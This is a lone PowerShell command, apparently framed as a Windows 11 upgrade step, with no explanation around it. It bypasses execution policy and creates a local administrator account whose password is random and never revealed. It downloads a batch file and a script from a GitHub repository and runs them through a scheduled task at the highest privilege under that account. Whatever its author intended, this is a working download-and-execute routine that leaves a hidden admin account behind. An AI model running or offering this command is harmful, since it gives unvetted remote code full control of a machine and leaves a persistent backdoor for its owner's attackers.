powershell -ExecutionPolicy Bypass -NoProfile -Command "$root='C:\Win11Upgrade';$bat=Join-Path $root 'RepoHandler.bat';$ps1=Join-Path $root 'RepoHandler.ps1';$urlbat='https://raw.githubusercontent.com/sctcoder1/project-711-d/main/RepoHandler.bat';$urlps1='https://raw.githubusercontent.com/sctcoder1/project-711-d/main/RepoHandler.ps1';New-Item -ItemType Directory -Force -Path $root | Out-Null;$user='WinUpgTemp';$pass=-join((33..126)|Get-Random -Count 16|ForEach-Object {[char]$_});$secure=ConvertTo-SecureString $pass -AsPlainText -Force; if(-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)){ New-LocalUser -Name $user -Password $secure -FullName 'Temp Upgrade Admin' -PasswordNeverExpires; Add-LocalGroupMember -Group Administrators -Member $user }; Invoke-WebRequest -Uri $urlbat -OutFile $bat -UseBasicParsing; Invoke-WebRequest -Uri $urlps1 -OutFile $ps1 -UseBasicParsing; $action=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument ('/c start /min \"' + $bat + '\"'); $trigger=New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(10)); $principal=New-ScheduledTaskPrincipal -UserId $user -LogonType Password -RunLevel Highest; Register-ScheduledTask -TaskName 'Win11_RepoHandler' -Action $action -Trigger $trigger -Principal $principal -Password $pass -Force | Out-Null; Start-ScheduledTask -TaskName 'Win11_RepoHandler'"
